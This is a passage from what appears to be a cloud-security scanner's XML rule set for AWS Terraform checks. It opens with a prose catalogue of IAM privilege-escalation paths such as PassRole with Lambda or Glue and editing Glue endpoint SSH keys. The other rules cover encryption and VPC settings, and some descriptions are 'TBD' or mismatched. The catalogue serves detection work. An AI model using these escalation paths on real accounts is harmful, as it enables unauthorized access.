Attaching a higher-privileged policy to a group that they have access to: An attacker with the iam:AttachGroupPolicy permission can escalate privileges by attaching a policy to a group that they are a part of, adding the permissions of that policy to the attacker.</p>
<p><em>AttachRolePolicy</em><br/>
Attaching a higher-privileged policy to a role that they have access to: An attacker with the iam:AttachRolePolicy permission can escalate privileges by attaching a policy to a role that they have access to, adding the permissions of that policy to the attacker.</p>
<p><em>PutUserPolicy</em><br/>
Creating/updating an inline policy for a user: An attacker with the iam:PutUserPolicy permission can escalate privileges by creating or updating an inline policy for a user that they have access to, adding the permissions of that policy to the attacker.</p>
<p><em>PutGroupPolicy</em><br/>
Creating/updating an inline policy for a group: An attacker with the iam:PutGroupPolicy permission can escalate privileges by creating or updating an inline policy for a group that they are a part of, adding the permissions of that policy to the attacker.</p>
<p><em>PutRolePolicy</em><br/>
Creating/updating an inline policy for a role: An attacker with the iam:PutRolePolicy permission can escalate privileges by creating or updating an inline policy for a role that they have access to, adding the permissions of that policy to the attacker.</p>
<p><strong>Updating an AssumeRole Policy</strong><br/>
<em>UpdatingAssumeRolePolicy</em><br/>
Updating the AssumeRolePolicyDocument of a role: An attacker with the iam:UpdateAssumeRolePolicy and sts:AssumeRole permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.</p>
<p><em>iam:PassRole</em><br/>
CreateEC2WithExistingIP<br/>
Creating an EC2 instance with an existing instance profile: An attacker with the iam:PassRole and ec2:RunInstances permissions can create a new EC2 instance that they will have operating system access to and pass an existing EC2 instance profile/service role to it.</p>
<p><em>PassExistingRoleToNewLambdaThenInvoke</em><br/>
Passing a new role to a Lambda function, then invoking it: A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.</p>
<p><em>PassExistingRoleToNewLambdaThenTriggerWithNewDynamo</em><br/>
Passing a role to a new Lambda function, then triggering it with DynamoDB: A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.</p>
<p><em>PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo</em><br/>
Passing a role to a new Lambda function, then triggering it with DynamoDB: A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.</p>
<p><em>EditExistingLambdaFunctionWithRole</em><br/>
Updating the code of an existing privileged Lambda function: An attacker with the lambda:UpdateFunctionCode permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role.</p>
<p><em>PassExistingRoleToNewGlueDevEndpoint</em><br/>
Passing a role to a Glue Development Endpoint: An attacker with the iam:PassRole and glue:CreateDevEndpoint permissions could create a new AWS Glue development endpoint and pass an existing service role to it.</p>
<p><em>PassExistingRoleToCloudFormation</em><br/>
Passing a role to CloudFormation: An attacker with the iam:PassRole and cloudformation:CreateStack permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.</p>
<p><em>PassExistingRoleToNewDataPipeline</em><br/>
Passing a role to Data Pipeline: An attacker with the iam:PassRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions would be able to escalate privileges by creating a pipeline and updating it to run an arbitrary AWS CLI command or create other resources, either once or on an interval with the permissions of the role that was passed in.</p>
<p><strong>Privilege Escalation using AWS Services</strong><br/>
<em>UpdateExistingGlueDevEndpoint</em><br/>
Updating an existing Glue Dev Endpoint: An attacker with the glue:UpdateDevEndpoint permission would be able to update the associated SSH public key of an existing Glue development endpoint, to then SSH into it and have access to the permissions the attached role has access to.</p>
<p>For more info, visit cloudsplaning documentation<br/>
<a href="https://cloudsplaining.readthedocs.io/en/latest/glossary/privilege-escalation/" target="_self">https://cloudsplaining.readthedocs.io/en/latest/glossary/privilege-escalation/</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-does-not-allow-privilege-escalation' target='_blank'> https://docs.bridgecrew.io/docs/ensure-iam-policies-does-not-allow-privilege-escalation</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-does-not-allow-privilege-escalation' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_112</key>
    <name>Ensure Session Manager data is encrypted in transit</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="session-manager-data-is-not-encrypted-in-transit"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-session-manager-data-is-not-encrypted-in-transit"></div>Session Manager data is not encrypted in transit</div><a aria-label="Skip link to Session Manager data is not encrypted in transit" class="heading-anchor-icon fa fa-anchor" href="#session-manager-data-is-not-encrypted-in-transit"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies AWS RDS DB (Relational Database Service Database) cluster snapshots which are not encrypted. It is highly recommended to implement encryption at rest when you are working with production data that have sensitive information, to protect from unauthorized access.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ssm_document</li>
<li><strong>Argument</strong>:  kmsKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_ssm_document.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_ssm_document.test.tf">resource "aws_ssm_document" "enabled" {
  name          = "SSM-SessionManagerRunShell"
  document_type = "Session"

  content = &lt;&lt;DOC
  {
        ...
    "inputs": {
      ...
      "s3EncryptionEnabled": true,
   +  "kmsKeyId": "${var.kms_key_id}",
      "runAsEnabled": false,    
            ...
      }
    }
  }
DOC
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-session-manager-data-is-encrypted-in-transit' target='_blank'> https://docs.bridgecrew.io/docs/ensure-session-manager-data-is-encrypted-in-transit</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-session-manager-data-is-encrypted-in-transit' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_130</key>
    <name>Ensure VPC subnets do not assign public IP by default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="vpc-subnets-should-not-allow-automatic-public-ip-assignment"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-vpc-subnets-should-not-allow-automatic-public-ip-assignment"></div>VPC subnets should not allow automatic public IP assignment</div><a aria-label="Skip link to VPC subnets should not allow automatic public IP assignment" class="heading-anchor-icon fa fa-anchor" href="#vpc-subnets-should-not-allow-automatic-public-ip-assignment"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>VPC subnet is a part of the VPC having its own rules for traffic. Assigning the Public IP to the subnet automatically (on launch) can accidentally expose the instances within this subnet to internet and should be edited to 'No' post creation of the Subnet.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_subnet</li>
<li><strong>Argument:</strong> map_public_ip_on_launch</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_subnet.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_subnet.test.tf">resource "aws_subnet" "test" {
 ...
+ map_public_ip_on_launch = false
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-vpc-subnets-do-not-assign-public-ip-by-default' target='_blank'> https://docs.bridgecrew.io/docs/ensure-vpc-subnets-do-not-assign-public-ip-by-default</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-vpc-subnets-do-not-assign-public-ip-by-default' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_146</key>
    <name>Ensure that RDS database cluster snapshot is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-database-cluster-snapshot-is-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-database-cluster-snapshot-is-not-encrypted"></div>RDS database cluster snapshot is not encrypted</div><a aria-label="Skip link to RDS database cluster snapshot is not encrypted" class="heading-anchor-icon fa fa-anchor" href="#rds-database-cluster-snapshot-is-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>:  aws_db_cluster_snapshot</li>
<li><strong>Argument</strong>:  storage_encrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_db_cluster_snapshot" "example" {
    ...
+ storage_encrypted = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-rds-database-cluster-snapshot-is-encrypted-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-rds-database-cluster-snapshot-is-encrypted-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-rds-database-cluster-snapshot-is-encrypted-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_147</key>
    <name>Ensure that CodeBuild projects are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="codebuild-projects-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-code-build-projects-are-not-encrypted"></div>CodeBuild projects are not encrypted</div><a aria-label="Skip link to CodeBuild projects are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#codebuild-projects-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_codebuild_project</li>
<li><strong>Argument</strong>:  encryption_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_codebuild_project" "example" {
  ...
+ encryption_key = "AWS_Key_Management_Service_example"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-codebuild-projects-are-encrypted-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-codebuild-projects-are-encrypted-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-codebuild-projects-are-encrypted-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_148</key>
    <name>Ensure no default VPC is planned to be provisioned</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-vpc-is-planned-to-be-provisioned"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-vpc-is-planned-to-be-provisioned"></div>Default VPC is planned to be provisioned</div><a aria-label="Skip link to Default VPC is planned to be provisioned" class="heading-anchor-icon fa fa-anchor" href="#default-vpc-is-planned-to-be-provisioned"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-no-default-vpc-is-planned-to-be-provisioned' target='_blank'> https://docs.bridgecrew.io/docs/ensure-no-default-vpc-is-planned-to-be-provisioned</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-no-default-vpc-is-planned-to-be-provisioned' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_149</key>
    <name>Ensure that Secrets Manager secret is encrypted using KMS CMK</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="secrets-manager-secret-is-not-encrypted-using-kms-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-secrets-manager-secret-is-not-encrypted-using-kms-customer-managed-key-cmk"></div>Secrets Manager secret is not encrypted using KMS Customer Managed Key (CMK)</div><a aria-label="Skip link to Secrets Manager secret is not encrypted using KMS Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#secrets-manager-secret-is-not-encrypted-using-kms-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By default, secrets manager secrets are encrypted using the AWS-managed key <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws/secretsmanager</code>. It is best practice to explicitly provide a customer managed key to use instead.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_secretsmanager_secret</li>
<li><strong>Argument</strong>:  kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_secretsmanager_secret" "enabled" {
   ...
 + kms_key_id = var.kms_key_id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-secrets-manager-secret-is-encrypted-using-kms' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-secrets-manager-secret-is-encrypted-using-kms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-secrets-manager-secret-is-encrypted-using-kms' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_106</key>
    <name>Ensure EBS default encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ebs-default-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ebs-default-encryption-is-disabled"></div>EBS default encryption is disabled</div><a aria-label="Skip link to EBS default encryption is disabled" class="heading-anchor-icon fa fa-anchor" href="#ebs-default-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies AWS regions in which new EBS volumes are getting created without any encryption. Encrypting data at rest reduces unintentional exposure of data stored in EBS volumes. It is recommended to configure EBS volume at the regional level so that every new EBS volume created in that region will be enabled with encryption by using a provided encryption key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable encryption at region level by default, follow below URL:<br/>
<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" target="_self">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default</a></p>
<p>Additional Information:<br/>
To detect existing EBS volumes that are not encrypted ; refer Saved Search:<br/>
AWS EBS volumes are not encrypted_RL<br/>
To detect existing EBS volumes that are not encrypted with CMK, refer Saved Search:<br/>
AWS EBS volume not encrypted using Customer Managed Key_RL</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ebs_encryption_by_default</li>
<li><strong>Argument</strong>:  enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_ebs_encryption_by_default" "enabled" {
+ enabled = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-ebs-default-encryption-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-ebs-default-encryption-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-ebs-default-encryption-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_152</key>
    <name>Ensure that Load Balancer (Network/Gateway) has cross-zone load balancing enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="load-balancer-networkgateway-does-not-have-cross-zone-load-balancing-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-load-balancer-network-gateway-does-not-have-cross-zone-load-balancing-enabled"></div>Load Balancer (Network/Gateway) does not have cross-zone load balancing enabled</div><a aria-label="Skip link to Load Balancer (Network/Gateway) does not have cross-zone load balancing enabled" class="heading-anchor-icon fa fa-anchor" href="#load-balancer-networkgateway-does-not-have-cross-zone-load-balancing-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lb</li>
<li><strong>Argument:</strong> enable_cross_zone_load_balancing</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_lb" "enabled" {
  ...
+ enable_cross_zone_load_balancing = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-load-balancer-networkgateway-has-cross-zone-load-balancing-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-load-balancer-networkgateway-has-cross-zone-load-balancing-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-load-balancer-networkgateway-has-cross-zone-load-balancing-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_153</key>
    <name>Autoscaling groups should supply tags to launch configurations</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="no-tags-supplied-by-autoscaling-groups-to-launch-configurations"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-no-tags-supplied-by-autoscaling-groups-to-launch-configurations"></div>No tags supplied by Autoscaling groups to launch configurations</div><a aria-label="Skip link to No tags supplied by Autoscaling groups to launch configurations" class="heading-anchor-icon fa fa-anchor" href="#no-tags-supplied-by-autoscaling-groups-to-launch-configurations"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Tags help you do the following:</p>
<ul>
<li>Control access to Auto Scaling groups based on tags. You can use conditions in your IAM policies to control access to Auto Scaling groups based on the tags on that group. </li>
<li>Identify and organize your AWS resources. Many AWS services support tagging, so you can assign the same tag to resources from different services to indicate that the resources are related.<br/>
You can apply tag-based, resource-level permissions in the identity-based policies that you create for Amazon EC2 Auto Scaling. This gives you better control over which resources a user can create, modify, use, or delete.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_autoscaling_group</li>
<li><strong>Argument</strong>:  launch_configuration, tags</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_autoscaling_group" "passtag" {
    ...
+ launch_configuration      = aws_launch_configuration.foobar.name
+  tags = concat(
    [
      {
        "key"                 = "interpolation1"
        "value"               = "value3"
        "propagate_at_launch" = true
      },
      ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/autoscaling-groups-should-supply-tags-to-launch-configurations' target='_blank'> https://docs.bridgecrew.io/docs/autoscaling-groups-should-supply-tags-to-launch-configurations</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/autoscaling-groups-should-supply-tags-to-launch-configurations' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_154</key>
    <name>Ensure Redshift is not deployed outside of a VPC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="redshift-is-deployed-outside-of-a-vpc"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-redshift-is-deployed-outside-of-a-vpc"></div>Redshift is deployed outside of a VPC</div><a aria-label="Skip link to Redshift is deployed outside of a VPC" class="heading-anchor-icon fa fa-anchor" href="#redshift-is-deployed-outside-of-a-vpc"></a></h1>
